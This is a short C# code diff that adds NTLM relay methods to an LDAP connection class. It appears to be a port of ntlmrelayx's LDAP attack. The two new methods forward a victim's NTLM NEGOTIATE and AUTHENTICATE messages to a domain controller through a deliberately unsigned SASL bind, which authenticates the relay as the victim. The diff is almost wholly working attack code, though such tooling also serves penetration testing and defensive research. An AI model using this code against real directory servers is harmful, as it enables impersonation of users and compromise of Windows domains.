@@ -66,6 +66,35 @@ public sealed class LdapConnection : IDisposable
     }
 
     /// <summary>
+    /// Relay target side (ntlmrelayx ldapattack): sends the victim's NTLM NEGOTIATE (Type 1) to the
+    /// DC's LDAP as the first leg of a GSS-SPNEGO SASL bind and returns the DC's CHALLENGE (Type 2).
+    /// The bind is deliberately unsigned (the relay holds no session key), which is exactly what LDAP
+    /// signing / channel binding is meant to reject.
+    /// </summary>
+    public byte[] RelayBindChallenge(byte[] victimType1)
+    {
+        LdapBindResponse first = SaslBind(GssSpnego, Spnego.WrapInitialToken(victimType1));
+        if (!first.SaslInProgress)
+        {
+            throw new InvalidOperationException(
+                $"DC did not continue the SASL bind (result {first.ResultCode}: {first.DiagnosticMessage}).");
+        }
+
+        return Spnego.ExtractResponseToken(first.ServerSaslCreds); // the DC's Type 2
+    }
+
+    /// <summary>
+    /// Relay target side (ntlmrelayx ldapattack): forwards the victim's NTLM AUTHENTICATE (Type 3) and
+    /// optional mechListMIC to the DC's LDAP as the second SASL-bind leg, and returns the LDAP result
+    /// code (0 = bind succeeded, i.e. the relay is now authenticated as the victim).
+    /// </summary>
+    public int RelayBindAuthenticate(byte[] victimType3, byte[]? mechListMic)
+    {
+        LdapBindResponse final = SaslBind(GssSpnego, Spnego.WrapResponseToken(victimType3, mechListMic));
+        return final.ResultCode;
+    }
+
+    /// <summary>
     /// Runs the <c>CheckLDAPStatus</c> signing probe: an unsigned GSS-SPNEGO NTLM bind.
     /// If the DC requires LDAP signing it answers the final bind with
     /// <c>strongerAuthRequired</c> (result 8); otherwise the bind proceeds past it. The probe
